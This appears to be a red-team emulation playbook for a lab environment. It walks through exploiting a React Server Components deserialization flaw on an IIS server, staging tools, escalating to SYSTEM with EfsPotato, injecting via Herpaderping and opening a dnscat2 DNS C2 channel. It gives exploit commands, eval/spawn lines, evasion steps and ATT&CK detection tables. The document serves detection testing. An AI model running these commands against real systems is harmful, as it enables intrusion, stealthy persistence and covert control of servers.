# Phase 1 - Initial Access & Command and Control

## Overview
The attacker targets an internal IIS server that hosts a web application: `react.testlab.local`. This application presents an exploitation path that is pursued.

The attacker directly exploits a React Server Components deserialization vulnerability (CVE-2025-55182) on `react.testlab.local` to achieve unauthenticated RCE on the IIS server itself, then escalates to `NT AUTHORITY\SYSTEM` via `SeImpersonatePrivilege`.

**Phase 1 consists of one main step and one optional alternative step:**

- **Step 1A** *(Main)* — Privilege Escalation + File-based Loading (Full Chain): escalates to `NT AUTHORITY\SYSTEM` via EfsPotato, delivers dnscat2 as a disk file through Herpaderping, and opens a SYSTEM cmd.exe shell that drives Phases 2–5.
- **Step 1B** *(Alternative Enrichment)* — Reflective Code Loading Demo: reuses the same react2shell session to demonstrate loading dnscat2 via stdin pipe without writing the PE to disk (T1620). Only the T1620 technique row is unique to this step; all other behaviors are already executed under Step 1A.

---

## Step 0 - Setup

> Full setup procedures are documented in [Setup.md](Setup.md).

---

## Step 1A - Privilege Escalation + File-based Loading (Full Chain)

### Voice Track

The attacker exploits `react.testlab.local` — a Next.js application running on the same IIS server under `iisnode`. A crafted React Server Components multipart request reaches the vulnerable deserialization path and executes JavaScript inside the Node.js worker as `IIS APPPOOL\react.testlab.local`.

With a live web RCE shell established, the react2shell staging channel is used to stage three binaries directly to `.bin` files: `CertEnrollAgent.bin` (the CWLHerpaderping loader), `CertEnrollSvc.bin` (the EfsPotato SYSTEM escalation tool), and `CertCA.bin` (the dnscat2 payload). For each payload, the `stage` command reads the raw PE from the attacker's local disk, base64-encodes it in Python memory, streams the encoded bytes in 2,000-character chunks into `global.__stageBuffer` on the target Node.js process via eval, then flushes the decoded binary directly to the destination `.bin` path in a single `Buffer.from(__stageBuffer,'base64')` write call — no `.b64` file is written to the target disk at any point during staging.

With `CertEnrollSvc.exe` staged, the attacker fires it via `eval` + detached `spawn` from the still-live Node.js shell. CertEnrollSvc coerces a privileged local named-pipe connection and impersonates the `NT AUTHORITY\SYSTEM` token, then uses `CreateProcessAsUser` to launch `CertEnrollAgent.exe` in a hidden window as SYSTEM. CertEnrollAgent reads `CertCA.bin` from disk, deletes it immediately to remove the file artifact (T1070.004), and performs the Herpaderping loader flow: the dnscat2 PE is written into a temporary section-backed image (`HD*.tmp`), a ghost process is created with the image path `C:\Windows\System32\RuntimeBroker.exe`, the temporary file is overwritten to break post-creation scanning, and the ghost process PEB is rewritten to spoof both the image path and command-line arguments. A second C2 session is established from the IIS host as `NT AUTHORITY\SYSTEM`. The attacker issues a `shell` command to spawn `cmd.exe` under the ghost process; all subsequent commands in Phases 2–5 execute within this child shell.

> **Detection Assumption (T1070.004):** File deletion detection assumes EDR captures process handle attribution during file I/O operations. If the EDR product only provides file-level events without process attribution, T1070.004 should be marked as Not Calibrated due to failure of Condition 3 (Independently Verifiable) — the evaluator cannot verify which process deleted `CertCA.bin` without relying on red team claims or source code analysis.

> Further reading: [rce-react2shell.md](../further-reading/rce-react2shell.md)
> covers the exploit tool and staging flow; [efspotato.md](../further-reading/efspotato.md)
> covers `CertEnrollSvc.cs`; [process-herpaderping.md](../further-reading/process-herpaderping.md)
> covers `CertEnrollAgent.exe`; [dnscat2.md](../further-reading/dnscat2.md)
> covers the DNS C2 client.

### Setup

- ☣️ Launch the interactive exploitation shell against the target

  ```bash
  python run_exploit.py -t http://react.testlab.local
  ```

  - ***Expected Output***

    ```text
    [+] Target: http://react.testlab.local
    [+] Type 'help' for available commands
    [*] Testing connection...
    [+] Connection established!
    ```

### Procedures

- ☣️ Stage `CertEnrollAgent.exe` (Herpaderping loader) — encode + stream + decode in one step, no `.b64` disk artifact; then rename to `.exe`

  ```
  stage ../CWLHerpaderping/x64/Release/CWLHerpaderping.exe C:\ProgramData\CertEnrollAgent.bin
  rename C:\ProgramData\CertEnrollAgent.bin C:\ProgramData\CertEnrollAgent.exe
  ```

  - ***Expected Output***

    ```text
    [*] Staging .../CWLHerpaderping.exe (...) -> C:\ProgramData\CertEnrollAgent.bin in N chunks (NO .b64 disk artifact)...
    [+] File staged successfully -> C:\ProgramData\CertEnrollAgent.bin (... bytes, NO .b64 disk artifact!)
    [+] File renamed successfully -> C:\ProgramData\CertEnrollAgent.exe
    ```

- ☣️ Stage `CertEnrollSvc.exe` (EfsPotato escalation tool) — encode + stream + decode in one step, no `.b64` disk artifact; then rename to `.exe`

  ```
  stage ../EfsPotato/CertEnrollSvc.exe C:\Windows\Temp\CertEnrollSvc.bin
  rename C:\Windows\Temp\CertEnrollSvc.bin C:\Windows\Temp\CertEnrollSvc.exe
  ```

  - ***Expected Output***

    ```text
    [*] Staging .../CertEnrollSvc.exe (...) -> C:\Windows\Temp\CertEnrollSvc.bin in N chunks (NO .b64 disk artifact)...
    [+] File staged successfully -> C:\Windows\Temp\CertEnrollSvc.bin (... bytes, NO .b64 disk artifact!)
    [+] File renamed successfully -> C:\Windows\Temp\CertEnrollSvc.exe
    ```

- ☣️ Stage dnscat2 payload to disk (file-based staging) — encode + stream + decode in one step, no `.b64` disk artifact

  ```
  stage ../dnscat2/go-client/dnscat2.exe C:\ProgramData\CertCA.bin
  ```

  - ***Expected Output***

    ```text
    [*] Staging .../dnscat2.exe (...) -> C:\ProgramData\CertCA.bin in N chunks (NO .b64 disk artifact)...
    [+] File staged successfully -> C:\ProgramData\CertCA.bin (... bytes, NO .b64 disk artifact!)
    ```

- ☣️ Launch `CertEnrollSvc.exe` (EfsPotato) via eval detached spawn — exploits `SeImpersonatePrivilege` to run `CertEnrollAgent.exe` as `NT AUTHORITY\SYSTEM`; CertEnrollAgent reads `CertCA.bin` from disk and deletes it (T1070.004)

  ```
  eval process.mainModule.require('child_process').spawn('C:/Windows/Temp/CertEnrollSvc.exe',['C:/ProgramData/CertEnrollAgent.exe'],{detached:true,stdio:'ignore'}).unref()
  ```

  - ***Expected Output***

    ```text
    (no output — detached spawn)
    ```

- ☣️ Switch to the attacker machine and confirm the SYSTEM C2 session

  ```text
  dnscat2> New session established: <session-id-1>
  dnscat2> session -i <session-id-1>
  command (iis-server) 1> whoami
  ```

  - ***Expected Output***

    ```text
    nt authority\system
    ```

- ☣️ Open an interactive `cmd.exe` shell from the SYSTEM dnscat2 session

  ```text
  command (iis-server) 1> shell
  ```

  - ***Expected Output***

    ```text
    New session created: <session-id-2>
    ```

  ```text
  dnscat2> session -i <session-id-2>
  sh (iis-server) 2>
  ```

  > **Note:** `shell` spawns `cmd.exe` as a child of the `RuntimeBroker.exe` ghost process under `NT AUTHORITY\SYSTEM`. All subsequent commands in Phases 2–5 that run from the IIS01 SYSTEM session execute within this `cmd.exe` child.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - |
| Initial Access | T1190 | Exploit Public-Facing Application | Windows | HTTP POST to React RSC endpoint with `Next-Action: x` header and multipart body containing `"then":"$1:__proto__:then"` field; server responds with `X-Action-Redirect: /login?a=<base64>` header carrying command output | Not Calibrated - Not Benign | Attacker sends crafted RSC flight data to `react.testlab.local` exploiting CVE-2025-55182 deserialization to inject JavaScript into `_prefix` field | react.testlab.local | IIS APPPOOL\react.testlab.local | [payload_generator.py](../../resources/payloads/react2shell-tool/exploit_tool/payload_generator.py) | - |
| Execution | T1059.007 | Command and Scripting Interpreter: JavaScript | Windows | `iisnode` evaluates attacker-controlled JavaScript embedded in the `_prefix` response field; no child process created; execution occurs within the existing Node.js worker process | Not Calibrated - Not Benign | Exploit injects `eval(String.fromCharCode(...))` as the `_prefix` value, executing arbitrary Node.js code in the IIS worker process | react.testlab.local | IIS APPPOOL\react.testlab.local | [payload_generator.py build_exploit_payload()](../../resources/payloads/react2shell-tool/exploit_tool/payload_generator.py) | - |
| Defense Evasion | T1027.010 | Obfuscated Files or Information: Command Obfuscation | Windows | JavaScript payload delivered as `eval(String.fromCharCode(<decimal-list>))` with no readable string literals; source code is not present in server logs or request bodies | Not Calibrated - Not Benign | All `fs` API calls and path strings are encoded as charcode arrays to evade string-based log detection | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py to_charcode()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | - |
| Command and Control | T1105 | Ingress Tool Transfer | Windows | `node.exe` accumulates base64 chunks in `global.__stageBuffer` (in-process memory) and writes `CertEnrollAgent.bin`, `CertEnrollSvc.bin`, and `CertCA.bin` directly to disk on IIS01 — no intermediate `.b64` files written to target; observable as `node.exe` writing PE-format `.bin` files | Calibrated - Not Benign | `stage` command reads raw PE binary locally, base64-encodes in Python memory, streams 2000-char chunks into `global.__stageBuffer` on target via eval, then flushes decoded bytes to `.bin` destination in one `Buffer.from(__stageBuffer,'base64')` write — no child process spawned, no `.b64` on disk | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py stage()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | - |
| Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | Windows | `node.exe` decodes base64 from in-process `global.__stageBuffer` and writes PE bytes to a `.bin` staging file on IIS01; `node.exe` then renames each `.bin` to `.exe` — no intermediate `.b64` file on disk at any point | Calibrated - Not Benign | `stage` command decodes base64 from in-memory global buffer to PE bytes using Node.js `Buffer` API via eval; `rename` promotes `.bin` to `.exe` — no `.b64` disk artifact, no upload step | react.testlab.local | IIS APPPOOL\react.testlab.local | [file_ops.py stage()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py), [file_ops.py rename()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | - |
| Privilege Escalation | T1134.001 | Access Token Manipulation: Token Impersonation/Theft | Windows | Sysmon Event 1 on IIS01: `CertEnrollAgent.exe` spawned by `CertEnrollSvc.exe` (IIS APPPOOL\react.testlab.local); `CertEnrollAgent.exe` process token context shows `NT AUTHORITY\SYSTEM` — AppPool identity producing a SYSTEM-privileged child is the primary observable of the EfsPotato named-pipe token impersonation chain | Calibrated - Not Benign | Step 1A: CertEnrollSvc uses `SeImpersonatePrivilege` to obtain SYSTEM token via named-pipe impersonation; implementation details in [efspotato.md](../further-reading/efspotato.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [CertEnrollSvc.cs](../../resources/payloads/EfsPotato/CertEnrollSvc.cs) | - |
| Privilege Escalation | T1134.002 | Access Token Manipulation: Create Process with Token | Windows | `CertEnrollSvc.exe` calls `CreateProcessAsUser` with the impersonated token; child process (`CertEnrollAgent.exe`) is created with `CREATE_NO_WINDOW` (`0x08000000`) | Not Calibrated - Not Benign | Step 1A: CertEnrollSvc spawns CertEnrollAgent as SYSTEM using the impersonated token; implementation details in [efspotato.md](../further-reading/efspotato.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [CertEnrollSvc.cs](../../resources/payloads/EfsPotato/CertEnrollSvc.cs) | - |
| Defense Evasion | T1562.006 | Impair Defenses: Indicator Blocking | Windows | **Opt-in (build with `-DENABLE_ETW_PATCH`)**: `CertEnrollAgent.exe` patches `ntdll!EtwEventWrite` in its own process memory to `xor eax,eax; ret` after changing the code page protection, causing subsequent ETW writes from the loader process to return fake success; not present in default build | Not Calibrated - Not Benign | CWLHerpaderping tampers with ETW before entering the sensitive loader flow; only active when compiled with `ENABLE_ETW_PATCH` preprocessor flag — see [build.md](../../resources/payloads/CWLHerpaderping/build.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp PatchEtw()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | - |
| Execution | T1106 | Native API | Windows | `CertEnrollAgent.exe` resolves native NT APIs from `ntdll.dll`, builds indirect syscall stubs, and uses them for `NtCreateSection`, `NtCreateProcessEx`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, and `NtCreateThreadEx` during the Herpaderping flow | Not Calibrated - Not Benign | CWLHerpaderping invokes the sensitive process-creation path through indirect syscalls; the loader also wraps those calls with stack spoofing, but the primary ATT&CK behavior here is native API / syscall execution | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp Herpaderping()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp), [syscall.h](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/syscall.h), [StackSpoof.cpp](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/StackSpoof.cpp) | - |
| Defense Evasion | T1055 | Process Injection | Windows | `CertEnrollAgent.exe` (NT AUTHORITY\SYSTEM) creates `%SystemRoot%\Temp\HD*.tmp`; `RuntimeBroker.exe` ghost spawned with `CertEnrollAgent.exe` as parent and no matching on-disk image at `C:\Windows\System32\RuntimeBroker.exe`; `HD*.tmp` content subsequently overwritten on IIS01 — characteristic Herpaderping file-write-then-overwrite sequence | Calibrated - Not Benign | Step 1A: CWLHerpaderping performs process-herpaderping-style injection: dnscat2 payload enters ghost process through image section, not via WriteProcessMemory; later remote writes used for metadata spoofing | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp Herpaderping()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | - |
| Defense Evasion | T1134.004 | Access Token Manipulation: Parent PID Spoofing | Windows | `CertEnrollAgent.exe` spawns `RuntimeBroker.exe` ghost process with PPID spoofed to `svchost.exe` or `wininit.exe` (Session 0) on IIS01 | Calibrated - Not Benign | Step 1A: CertEnrollAgent chooses Session 0 parent for ghost process; implementation details in [process-herpaderping.md](../further-reading/process-herpaderping.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp GetNonJobParent()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | - |
| Defense Evasion | T1070.004 | Indicator Removal: File Deletion | Windows | `CertEnrollAgent.exe` deletes `C:\ProgramData\CertCA.bin` from disk after loading the PE | Calibrated - Not Benign | Step 1A: CWLHerpaderping deletes the dnscat2 payload file after loading to remove forensic evidence; file deletion occurs in fallback mode when stdin is not redirected | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp GetPayloadBuffer()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | - |
| Defense Evasion | T1036.005 | Masquerading: Match Legitimate Resource Name or Location | Windows | ghost process reports `ImageFileName = C:\Windows\System32\RuntimeBroker.exe`; EDR image verification: PE mapped in the ghost process address space does not match the on-disk hash of `C:\Windows\System32\RuntimeBroker.exe` — image path vs. mapped content mismatch is the Herpaderping masquerade artifact | Calibrated - Not Benign | Step 1A: CWLHerpaderping makes ghost process resemble legitimate Windows component by assigning trusted image path; masquerading outcome mapped separately from PEB rewrite under process argument spoofing | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp Herpaderping()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | - |
| Command and Control | T1071.004 | Application Layer Protocol: DNS | Windows | `RuntimeBroker.exe` (dnscat2 ghost process) issues a high volume of DNS queries containing encoded subdomain labels to `crl.ms-cert.net` | Calibrated - Not Benign | Step 1A: dnscat2 C2 session established as SYSTEM via Herpaderping ghost process; bootstrapped from react2shell session via eval detached spawn of CertEnrollSvc | react.testlab.local | NT AUTHORITY\SYSTEM | [dnscat2.exe](../../resources/payloads/dnscat2.exe) | - |
| Command and Control | T1573.002 | Encrypted Channel: Asymmetric Cryptography | Windows | DNS query payloads are encrypted after dnscat2 session key negotiation | Not Calibrated - Not Benign | dnscat2 encrypts C2 session data; protocol details are covered in [dnscat2.md](../further-reading/dnscat2.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [dnscat2.exe](../../resources/payloads/dnscat2.exe) | - |
| Discovery | T1012 | Query Registry | Windows | EDR registry access event on IIS01: `RuntimeBroker.exe` (dnscat2 ghost process, NT AUTHORITY\SYSTEM) reads `HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{GUID}\NameServer`; `RuntimeBroker.exe` (UWP process broker) reading TCP/IP DNS resolver configuration keys is anomalous | Calibrated - Not Benign | Step 1A: dnscat2 enumerates TCP/IP interface GUIDs, reads NameServer/DhcpNameServer registry values to discover DNS resolver for C2 tunneling | react.testlab.local | NT AUTHORITY\SYSTEM | [getdns_windows.go getSystemDNS()](../../resources/payloads/dnscat2/go-client/cmd/dnscat/getdns_windows.go) | - |
| Defense Evasion | T1564.003 | Hide Artifacts: Hidden Window | Windows | `CertEnrollSvc.exe` spawns `CertEnrollAgent.exe` with `CREATE_NO_WINDOW` (`0x08000000`); dnscat2 executes without a console window | Not Calibrated - Not Benign | Step 1A: Escalation and C2 launch run without visible console windows; implementation details in [efspotato.md](../further-reading/efspotato.md) and [dnscat2.md](../further-reading/dnscat2.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [CertEnrollSvc.cs](../../resources/payloads/EfsPotato/CertEnrollSvc.cs), [dnscat2 build flags](../../resources/payloads/dnscat2/go-client) | - |
| Defense Evasion | T1564.010 | Hide Artifacts: Process Argument Spoofing | Windows | EDR cross-process memory write event on IIS01: `CertEnrollAgent.exe` (NT AUTHORITY\SYSTEM) calls `WriteProcessMemory` targeting the PEB `ProcessParameters` region of the `RuntimeBroker.exe` ghost process | Calibrated - Not Benign | Step 1A: CWLHerpaderping rewrites ghost process PEB metadata to hide true payload identity; this row captures the PEB spoofing mechanism separate from trusted name masquerading | react.testlab.local | NT AUTHORITY\SYSTEM | [CWLImplant.cpp Herpaderping()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp) | - |
| Defense Evasion | T1027.007 | Obfuscated Files or Information: Dynamic API Resolution | Windows | `CertEnrollAgent.exe` resolves native API addresses via PEB walk and DJB2 EAT hash lookup instead of static imports | Not Calibrated - Not Benign | CWLHerpaderping uses hash-based API resolution; implementation details are covered in [process-herpaderping.md](../further-reading/process-herpaderping.md) | react.testlab.local | NT AUTHORITY\SYSTEM | [api_hash.h](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/api_hash.h) | - |
| Defense Evasion | T1027.008 | Obfuscated Files or Information: Stripped Payloads | Windows | `dnscat2.exe` has its Go symbol table and DWARF debug information stripped; `CWLHerpaderping.exe` (deployed as `CertEnrollAgent.exe`) is a Visual C++ release build with no useful debug metadata exposed to responders | Not Calibrated - Not Benign | dnscat2 is compiled with Go release flags that omit symbol and DWARF debug information; CWLHerpaderping is deployed as a release-built C++ loader renamed to `CertEnrollAgent.exe` | react.testlab.local | NT AUTHORITY\SYSTEM | [dnscat2.exe](../../resources/payloads/dnscat2.exe), [CWLHerpaderping.exe](../../resources/payloads/CWLHerpaderping/x64/Release/CWLHerpaderping.exe) | - |
| Execution | T1059.003 | Command and Scripting Interpreter: Windows Command Shell | Windows | `cmd.exe` spawned as child of `RuntimeBroker.exe` ghost (dnscat2 SYSTEM parent); command line is `cmd.exe` with no arguments; parent image path is `C:\Windows\System32\RuntimeBroker.exe` | Calibrated - Not Benign | Step 1A: dnscat2 `shell` command spawns `cmd.exe` under the `RuntimeBroker.exe` ghost process as `NT AUTHORITY\SYSTEM`; all subsequent shell commands in Phases 2–5 from the IIS01 SYSTEM session execute within this `cmd.exe` child | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | - |

---

## Step 1B — Reflective Code Loading Demo (Alternative Enrichment)

> **Alternative Step** — Run after Step 1A to enrich technique coverage with T1620. Reuses the same react2shell exploit session. `CertEnrollAgent.exe` staged in Step 1A remains on disk and is reused here. All behaviors other than T1620 are identical to Step 1A and are not repeated in the reference table below.

### Voice Track

With the react2shell exploit session still live and `CertEnrollAgent.exe` already on disk from Step 1A, the attacker demonstrates an alternative payload delivery method. Rather than decoding dnscat2 to a `.bin` file and passing it to CertEnrollAgent via disk, the attacker keeps the payload encoded and pipes the raw PE bytes directly into `CertEnrollAgent.exe`'s stdin using the `herpload` command.

Node.js reads the base64 file in-process, decodes it to a `Buffer`, and passes the bytes to `CertEnrollAgent.exe` via a `spawnSync` stdin pipe. CertEnrollAgent detects the stdin redirection, reads the PE bytes from the pipe instead of from a file path argument, and performs the same Herpaderping loader flow as Step 1A — but the dnscat2 PE is never written to disk as a standalone file. The ghost `RuntimeBroker.exe` process is spawned and a new C2 session is established, this time running as `IIS APPPOOL\react.testlab.local` since no privilege escalation is involved.

The sole technique not present in Step 1A is T1620 (Reflective Code Loading): the dnscat2 binary enters process memory through a stdin pipe rather than through a disk-backed file path, eliminating the on-disk PE artifact that file-hash and AV detections require.

> Further reading: [rce-react2shell.md](../further-reading/rce-react2shell.md)
> covers the `herpload` command and stdin pipe staging flow; [process-herpaderping.md](../further-reading/process-herpaderping.md)
> covers the CertEnrollAgent stdin payload path in `GetPayloadBuffer()`.

### Procedures

- ☣️ Upload dnscat2 payload as base64 — payload remains encoded and is never decoded to disk as a PE

  ```
  upload dnscat2.b64 C:\Windows\Temp\dnscat2.b64
  ```

  - ***Expected Output***

    ```text
    [+] File uploaded successfully -> C:\Windows\Temp\dnscat2.b64 (NO process spawn!)
    ```

- ☣️ Reflectively load dnscat2 payload via stdin redirection (T1620) — CertEnrollAgent reads PE bytes from stdin pipe, eliminating the disk artifact

  ```
  herpload C:\Windows\Temp\dnscat2.b64 C:\ProgramData\CertEnrollAgent.exe
  ```

  - ***Expected Output***

    ```text
    [*] Reflectively loading C:\Windows\Temp\dnscat2.b64 via C:\ProgramData\CertEnrollAgent.exe stdin (T1620)...
    [+] PE loaded reflectively via stdin (NO disk artifact!)
    [*] Detection: node.exe spawns C:\ProgramData\CertEnrollAgent.exe with stdin pipe containing PE bytes
    [*] Payload never written to disk (T1620 - Reflective Code Loading)
    ```

- ☣️ Switch to the attacker machine and confirm the new C2 session (IIS APPPOOL context)

  ```text
  dnscat2> New session established: <session-id-3>
  dnscat2> session -i <session-id-3>
  command (iis-server) 3> whoami
  ```

  - ***Expected Output***

    ```text
    iis apppool\react.testlab.local
    ```

### Reference Tables

> Only the technique unique to this step is listed below. All other behaviors (T1190, T1059.007, T1027.010, T1105, T1140, T1562.006, T1106, T1055, T1134.004, T1036.005, T1564.010, T1027.007, T1027.008, T1071.004, T1573.002, T1012) are already documented in the Step 1A reference table.

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - |
| Defense Evasion | T1620 | Reflective Code Loading | Windows | `node.exe` spawns `CertEnrollAgent.exe` with stdin pipe containing PE file bytes (dnscat2.exe payload); no `C:\ProgramData\CertCA.bin` written to disk prior to or during `CertEnrollAgent.exe` execution on IIS01 | Calibrated - Not Benign | Step 1B: CertEnrollAgent reflectively loads dnscat2 from stdin pipe; payload read from base64 file, decoded in-memory by Node.js, piped via `spawnSync` stdin redirection — dnscat2.exe PE never written to disk, eliminating file artifacts | react.testlab.local | IIS APPPOOL\react.testlab.local | [CWLImplant.cpp GetPayloadBuffer()](../../resources/payloads/CWLHerpaderping/CWLHerpaderping/CWLImplant.cpp), [file_ops.py herpload()](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | - |

---

